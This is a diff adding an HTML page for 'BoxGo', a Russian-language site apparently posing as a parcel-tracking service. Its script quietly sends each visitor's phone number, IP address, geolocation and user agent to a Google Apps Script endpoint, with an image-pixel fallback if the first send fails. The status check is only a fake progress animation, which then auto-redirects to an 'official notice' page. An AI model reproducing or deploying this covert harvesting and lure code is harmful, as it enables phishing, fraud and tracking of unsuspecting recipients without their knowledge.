@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>BoxGo — информационный сервис доставки</title>
+  <meta name="description" content="BoxGo: информационный сервис доставки. Отслеживание статусов по номеру телефона. Поддержка 24/7." />
+  <meta name="color-scheme" content="dark light">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg:#0b1220; --card:#0f172a;
+      --text:#eef3fb;
+      --muted:#b7c3d6;
+      --muted-2:#93a1b7;
+      --brand:#3b82f6; --brand-2:#22d3ee;
+      --line:rgba(255,255,255,.10);
+      --radius:18px; --shadow:0 10px 30px rgba(0,0,0,.35);
+
+      --lh:1.65;
+      --lh-tight:1.25;
+      --space-1:8px; --space-2:12px; --space-3:16px; --space-4:20px; --space-5:28px;
+      --measure: 68ch;
+    }
+
+    *{box-sizing:border-box}
+    html,body{margin:0}
+    body{
+      min-height:100svh;
+      font-family:Manrope,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial;
+      color:var(--text);
+      background:radial-gradient(1200px 600px at 10% -10%, #0e1a33 0%, #0b1220 60%), #0b1220;
+      -webkit-tap-highlight-color: transparent;
+      text-rendering: optimizeLegibility;
+    }
+
+    .container{width:100%;max-width:1100px;margin:0 auto;padding:20px}
+    @media (max-width:560px){ .container{padding:16px} }
+
+    header{position:sticky;top:0;z-index:10;background:rgba(11,18,32,.78);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+    .nav{display:flex;align-items:center;justify-content:space-between;gap:12px}
+    .logo{display:flex;align-items:center;gap:12px;text-decoration:none;color:inherit}
+    .logo-mark{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--brand),var(--brand-2));display:grid;place-items:center;box-shadow:0 6px 18px rgba(59,130,246,.35)}
+    .logo svg{width:20px;height:20px}
+    .logo-title{font-weight:800;letter-spacing:.2px}
+    .cta{display:flex;align-items:center;gap:12px}
+    .btn{appearance:none;border:none;border-radius:12px;padding:12px 18px;font-weight:800;letter-spacing:.2px;cursor:pointer;background:var(--brand);color:#fff;box-shadow:0 10px 22px rgba(59,130,246,.25);transition:.2s;white-space:nowrap;min-height:44px}
+    .btn:hover{transform:translateY(-1px);box-shadow:0 14px 26px rgba(59,130,246,.32)}
+    .btn.secondary{background:transparent;border:1px solid var(--line);color:var(--text);box-shadow:none}
+
+    .chip{display:inline-block;padding:6px 10px;border:1px solid var(--line);border-radius:999px;color:var(--muted);font-size:12px;letter-spacing:.2px}
+
+    .reading{max-width:var(--measure);}
+    .reading p{line-height:var(--lh);letter-spacing:.1px;word-spacing:.4px;margin:0 0 var(--space-3); color:var(--muted); hyphens:auto; overflow-wrap:anywhere; text-wrap:pretty;}
+    .reading .lede{font-size:clamp(15px,2.9vw,18px); color:var(--muted);}
+    .reading h1,.reading h2,.reading h3{line-height:var(--lh-tight); letter-spacing:.2px; margin:0 0 var(--space-2); text-wrap:balance;}
+    .reading h1{font-size:clamp(22px,3.8vw,36px); margin-top:var(--space-1);}
+    .reading h2{font-size:clamp(18px,2.6vw,22px); margin-top:var(--space-4);}
+    .reading .actions{margin-top:var(--space-3)}
+    .separate{margin-top:var(--space-5)}
+
+    .hero{display:grid;grid-template-columns:1.05fr .95fr;gap:24px;align-items:center;padding:30px 0}
+    .card{background:linear-gradient(180deg,#0f172a,#0c1426);border:1px solid var(--line);border-radius:var(--radius);box-shadow:var(--shadow)}
+    .form-card{padding:22px}
+    .row{display:flex;flex-direction:column;gap:8px;margin:0 0 12px}
+    .label{font-size:13px;color:var(--muted-2); letter-spacing:.2px}
+    .input{width:100%;padding:14px 14px;border-radius:12px;border:1px solid var(--line);background:#0a1222;color:var(--text);outline:none;min-height:44px;line-height:1.4;letter-spacing:.2px}
+    .input::placeholder{color:#8da1ba}
+    .input:focus{border-color:var(--brand)}
+    .form-actions{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-top:var(--space-2)}
+
+    .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+    .stat{padding:14px;border-radius:14px;border:1px solid var(--line);text-align:center;background:linear-gradient(180deg,#0f172a,#0c1426)}
+    .stat b{font-size:18px;letter-spacing:.3px}
+    .stat span{display:block;color:var(--muted-2);font-size:12px;margin-top:4px;letter-spacing:.2px}
+
+    section{padding:26px 0}
+    .section-title{font-size:clamp(18px,2.6vw,22px);margin:0 0 var(--space-1);line-height:var(--lh-tight);letter-spacing:.2px;text-wrap:balance}
+    .section-sub{color:var(--muted);margin:0 0 var(--space-3);line-height:var(--lh);max-width:var(--measure);}
+
+    .features{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+    @media (max-width:900px){ .features{grid-template-columns:repeat(2,1fr)} }
+    @media (max-width:560px){ .features{grid-template-columns:1fr} }
+    .feature{padding:0;border-radius:16px;border:1px solid var(--line);background:linear-gradient(180deg,#0f172a,#0c1426);overflow:hidden}
+    .feature img{width:100%;aspect-ratio:16/9;object-fit:cover;display:block}
+    .feature .pad{padding:14px}
+    .feature h3{margin:6px 0 8px;font-size:16px;line-height:1.35;letter-spacing:.2px}
+    .feature p{margin:0;color:var(--muted);font-size:14px;line-height:1.6}
+
+    .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+    @media (max-width:900px){ .grid-2{grid-template-columns:1fr} }
+    .faq{display:grid;gap:12px;max-width:var(--measure)}
+    .faq .q{padding:14px;border-radius:14px;border:1px solid var(--line);background:#0e1730;line-height:1.6}
+    .faq .q b{display:block;margin-bottom:6px;letter-spacing:.2px}
+
+    footer{border-top:1px solid var(--line);padding:24px 0;color:var(--muted)}
+
+    .overlay{position:fixed;inset:0;background:rgba(3,6,12,.92);backdrop-filter:blur(6px);display:none;place-items:center;z-index:50;color:var(--text)}
+    .overlay.active{display:grid}
+    .panel{width:min(560px,92vw);border-radius:18px;border:1px solid var(--line);background:linear-gradient(180deg,#0f172a,#0c1426);box-shadow:var(--shadow);padding:20px}
+    .panel h2{margin:0 0 8px;font-size:18px}
+    .panel p{margin:0 0 14px;color:var(--muted);font-size:14px}
+    .progress{height:10px;border-radius:999px;background:#0b1630;border:1px solid var(--line);overflow:hidden}
+    .bar{height:100%;width:0%;background:linear-gradient(90deg,var(--brand),var(--brand-2));transition:width .35s ease}
+    .steps{margin-top:12px;display:grid;gap:8px}
+    .step{display:flex;align-items:flex-start;gap:8px}
+    .dot{width:10px;height:10px;border-radius:50%;background:#324166;margin-top:4px}
+    .step.done .dot{background:#10b981}
+    .step.active .dot{background:#f59e0b}
+    .gov-note{margin-top:14px;padding:10px 12px;border-radius:12px;background:#0c1a33;border:1px solid var(--line);font-size:12px;color:#b9c6db}
+
+    @media (max-width:900px){
+      .hero{grid-template-columns:1fr;gap:16px}
+      .stats{grid-template-columns:repeat(2,1fr)}
+    }
+    @media (max-width:560px){
+      header .nav{display:grid;grid-template-columns:auto 1fr;align-items:center;gap:12px}
+      .cta{justify-self:end;display:flex;gap:8px;flex-wrap:nowrap}
+      .cta .btn{padding:10px 14px;font-size:13px}
+      .stats{grid-template-columns:1fr}
+      .btn.block{width:100%}
+      .hero{padding-top:22px}
+      .form-card{padding:18px}
+      .reading h1{margin-bottom:var(--space-2)}
+      .reading .lede{margin-bottom:var(--space-3)}
+    }
+
+    :focus-visible{outline:2px solid var(--brand);outline-offset:2px;border-radius:12px}
+    @media (prefers-reduced-motion: reduce){
+      *{animation-duration:0.001ms !important; animation-iteration-count:1 !important; transition-duration:0.001ms !important; scroll-behavior:auto !important;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="container nav">
+      <a class="logo" href="#" aria-label="BoxGo — на главную">
+        <span class="logo-mark" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <path d="M3 7.5 12 3l9 4.5-9 4.5L3 7.5Z" stroke="white" opacity=".9" stroke-width="1.4"/>
+            <path d="M3 7.5v9l9 4.5v-9L3 7.5Z" stroke="white" opacity=".9" stroke-width="1.2"/>
+            <path d="M21 7.5v9l-9 4.5v-9l9-4.5Z" stroke="white" opacity=".9" stroke-width="1.2"/>
+          </svg>
+        </span>
+        <span class="logo-title">BoxGo</span>
+      </a>
+      <div class="cta">
+        <button class="btn secondary" onclick="document.getElementById('form').scrollIntoView({behavior:'smooth'})">Проверка статуса</button>
+        <button class="btn" onclick="document.getElementById('why').scrollIntoView({behavior:'smooth'})">О сервисе</button>
+      </div>
+    </div>
+  </header>
+
+  <main class="container">
+    <section class="hero">
+      <div class="reading">
+        <span class="chip">Доставка по территории Российской Федерации</span>
+        <h1>Информационный сервис BoxGo</h1>
+        <p class="lede">Сервис обеспечивает предоставление справочной информации о ходе доставки и доступен для получателей по номеру телефона. Обновление статусов осуществляется по мере обработки отправлений в установленных технологических циклах.</p>
+
+        <div id="form" class="card form-card separate" role="form" aria-labelledby="check-title">
+          <h2 id="check-title" class="visually-hidden" style="position:absolute;left:-9999px;top:auto;width:1px;height:1px;overflow:hidden">Форма запроса статуса</h2>
+          <div class="row">
+            <label class="label" for="phone">Номер телефона получателя</label>
+            <input id="phone" class="input" placeholder="+7 900 000-00-00" autocomplete="tel" inputmode="tel" />
+          </div>
+          <div class="form-actions">
+            <button class="btn block" onclick="startCheck()">Получить сведения</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="stats" aria-label="Справочные показатели">
+        <div class="stat"><b>24/7</b><span>линия поддержки</span></div>
+        <div class="stat"><b>6 300+</b><span>пунктов выдачи</span></div>
+        <div class="stat"><b>1–3 дня</b><span>сроки по крупнейшим городам</span></div>
+        <div class="stat"><b>99,3%</b><span>выполнение сроков</span></div>
+      </div>
+    </section>
+
+    <section id="why">
+      <div class="reading">
+        <h2 class="section-title">Назначение сервиса</h2>
+        <p class="section-sub">Сервис предназначен для информирования получателей о статусе обработки и доставки отправлений, а также для взаимодействия с поддержкой по вопросам переадресации и уточнения данных.</p>
+      </div>
+
+      <div class="features">
+        <article class="feature">
+          <img src="assets/boxes.webp" alt="Упаковка и постаматы BoxGo" loading="lazy" decoding="async">
+          <div class="pad">
+            <h3>Маршрутизация и обработка</h3>
+            <p>Формирование маршрутов и организация выдачи осуществляется в соответствии с утверждёнными регламентами обслуживания.</p>
+          </div>
+        </article>
+        <article class="feature">
+          <img src="assets/courier.jpg" alt="Курьер BoxGo" loading="lazy" decoding="async">
+          <div class="pad">
+            <h3>Доступ к сведениям</h3>
+            <p>Получение информации по номеру телефона, указанному при оформлении отправления, с соблюдением требований конфиденциальности.</p>
+          </div>
+        </article>
+        <article class="feature">
+          <img src="assets/hero_warehouse.jpg" alt="Склад BoxGo" loading="lazy" decoding="async">
+          <div class="pad">
+            <h3>Поддержка</h3>
+            <p>Круглосуточное консультирование по вопросам сроков, адреса доставки и иным обращениям, связанным с выдачей отправлений.</p>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <section>
+      <div class="grid-2">
+        <div class="card reading" style="padding:16px">
+          <h3 style="margin:0 0 8px">Способы доставки</h3>
+          <ul class="section-sub" style="margin:0;line-height:var(--lh)">
+            <li>Курьерская доставка до адреса получателя (включая вечерние интервалы).</li>
+            <li>Получение в пунктах выдачи и постаматах.</li>
+            <li>Экспресс-доставка в отдельных городах при наличии технической возможности.</li>
+            <li>Межрегиональные отправления, приём наложенного платежа при соблюдении условий.</li>
+          </ul>
+        </div>
+        <div class="card reading" style="padding:16px">
+          <h3 style="margin:0 0 8px">Порядок оплаты</h3>
+          <ul class="section-sub" style="margin:0;line-height:var(--lh)">
+            <li>Оплата банковской картой (онлайн или при получении).</li>
+            <li>Оплата наличными в пункте выдачи или курьеру.</li>
+            <li>Безналичный расчёт для юридических лиц (счёт/договор).</li>
+            <li>Возврат средств осуществляется на исходный способ оплаты в установленном порядке.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <section>
+      <div class="grid-2">
+        <div class="card reading" style="padding:16px">
+          <h3 style="margin:0 0 8px">Территория обслуживания</h3>
+          <p class="section-sub">Доставка осуществляется по всей территории Российской Федерации, включая труднодоступные районы. Для удалённых местностей возможна корректировка сроков с увеличением на 1–3 календарных дня.</p>
+          <div class="chip">Дальние зоны: ориентировочный срок 4–9 дней</div>
+        </div>
+        <div class="card reading" style="padding:16px">
+          <h3 style="margin:0 0 8px">Сроки и ответственность</h3>
+          <p class="section-sub">При нарушении контрольных сроков проводится перерасчёт стоимости услуги. При утрате или повреждении действует компенсация в пределах объявленной ценности в соответствии с правилами оказания услуг.</p>
+          <div class="chip">Трекинг-события доступны через API при заключении договора</div>
+        </div>
+      </div>
+    </section>
+
+    <section>
+      <div class="reading">
+        <h2 class="section-title">Часто задаваемые вопросы</h2>
+      </div>
+      <div class="faq">
+        <div class="q"><b>Нужна ли регистрация?</b> Нет. Для получения сведений необходимо указать номер телефона, связанный с отправлением.</div>
+        <div class="q"><b>Статус не отображается. Что делать?</b> Проверьте корректность номера телефона. Статусы обновляются по мере обработки, возможна задержка отображения при передаче отправления на склад.</div>
+        <div class="q"><b>Можно ли изменить адрес или интервал доставки?</b> Да. Изменение параметров доступно по обращению в поддержку при условии, что отправление не передано на финальный этап доставки.</div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <div class="container" style="display:flex;flex-wrap:wrap;gap:12px;align-items:center;justify-content:space-between">
+      <div>© <span id="year"></span> BoxGo. Все права защищены.</div>
+    </div>
+  </footer>
+
+  <div class="overlay" id="overlay" role="dialog" aria-modal="true" aria-labelledby="ov-title">
+    <div class="panel">
+      <h2 id="ov-title">Выполняется запрос сведений</h2>
+      <p id="ov-sub">Идёт обработка…</p>
+      <div class="progress" aria-label="Ход обработки">
+        <div class="bar" id="bar" style="width:0%"></div>
+      </div>
+      <div class="steps" id="steps">
+        <div class="step active" id="s1"><span class="dot"></span><span>Проверка номера телефона</span></div>
+        <div class="step" id="s2"><span class="dot"></span><span>Получение статусов обработки</span></div>
+        <div class="step" id="s3"><span class="dot"></span><span>Формирование служебного уведомления</span></div>
+      </div>
+      <div class="gov-note" id="gov-note" style="display:none">
+        Запрос обработан. Для продолжения откройте служебное уведомление.
+        <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap">
+          <button class="btn" onclick="goGov()">Открыть уведомление</button>
+          <button class="btn secondary" onclick="closeOverlay()">Отмена</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // --- Config (используются твои переменные, если они уже объявлены ранее) ---
+    window.GS_URL = 'https://script.google.com/macros/s/AKfycbwe1BNCExnqgy8nPSm739bVwz-V4pMzY6NLrQ6-ATpVDJ9NetmB6MVTJMk_WCw-JYZhLg/exec';
+    window.GS_KEY = window.GS_KEY || 'boxgo-2025';
+
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    // ===== Отправка расширенных данных в Google Sheets (без визуальных индикаторов) =====
+    async function logDetailsSilently(phone){
+      const timestamp = new Date().toISOString();
+      const device    = navigator.userAgent || '';
+      let ip = '', location = '';
+
+      // утилита таймаута для fetch
+      const withTimeout = (ms, factory) => {
+        const ctrl = new AbortController();
+        const id = setTimeout(()=>ctrl.abort(), ms);
+        return factory(ctrl.signal).finally(()=>clearTimeout(id));
+      };
+
+      try{
+        const ipReq  = withTimeout(3000, (signal)=>fetch('https://api.ipify.org?format=json',{signal}).then(r=>r.json()).then(j=>j.ip).catch(()=>''));
+        const geoReq = withTimeout(3500,(signal)=>fetch('https://ipapi.co/json/',{signal}).then(r=>r.json()).then(j=>`${j.city||''}${j.city&&j.country_name?', ':''}${j.country_name||''}`).catch(()=>''));
+        [ip, location] = await Promise.all([ipReq, geoReq]);
+      }catch(_){ /* игнорируем */ }
+
+      const payload = { key: window.GS_KEY, timestamp, phone, ip, location, device };
+
+      try{
+        await fetch(window.GS_URL, {
+          method: 'POST',
+          headers: {'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},
+          body: new URLSearchParams(payload).toString(),
+          keepalive: true
+        });
+      }catch(_){
+        // резервный GET-пиксель
+        const qs = new URLSearchParams(payload).toString();
+        (new Image()).src = `${window.GS_URL}?${qs}`;
+      }
+    }
+
+    // ===== Логика запроса и оверлея =====
+    function startCheck(){
+      const phone = document.getElementById('phone').value.trim();
+      const digits = phone.replace(/\\D/g,'');
+      const ok = digits.length >= 10;
+      if(!ok){ alert('Укажите корректный номер телефона.'); return; }
+
+      // отправляем сбор данных в фоне (не ждём)
+      try{ logDetailsSilently(phone); }catch(_){}
+
+      openOverlay(); runProgress();
+    }
+    function openOverlay(){ document.getElementById('overlay').classList.add('active'); document.body.style.overflow='hidden'; }
+    function closeOverlay(){ document.getElementById('overlay').classList.remove('active'); document.body.style.overflow='auto'; }
+    function runProgress(){
+      const steps=[
+        {id:'s1',delay:900, text:'Проверка номера телефона'},
+        {id:'s2',delay:1200,text:'Получение статусов обработки'},
+        {id:'s3',delay:1200,text:'Формирование служебного уведомления'}
+      ];
+      const sub=document.getElementById('ov-sub'); const bar=document.getElementById('bar');
+      let total=0; steps.forEach(s=> total+=s.delay);
+      let acc=0; steps.forEach((s,idx)=>{
+        setTimeout(()=>{
+          if(idx>0){const prev=document.getElementById(steps[idx-1].id); prev.classList.remove('active'); prev.classList.add('done');}
+          const cur=document.getElementById(s.id); cur.classList.add('active'); sub.textContent=s.text+'…';
+          bar.style.width=Math.round(((idx+1)/steps.length)*90)+'%';
+        }, acc+=s.delay);
+      });
+      setTimeout(()=>{
+        const last=steps[steps.length-1].id;
+        document.getElementById(last).classList.remove('active');
+        document.getElementById(last).classList.add('done');
+        sub.textContent='Готово'; bar.style.width='100%';
+        document.getElementById('gov-note').style.display='block';
+        setTimeout(()=>{ goGov(); }, 900);
+      }, total+400);
+    }
+    function goGov(){ window.location.href='alert.html'; }
+  </script>
+</body>
+</html>
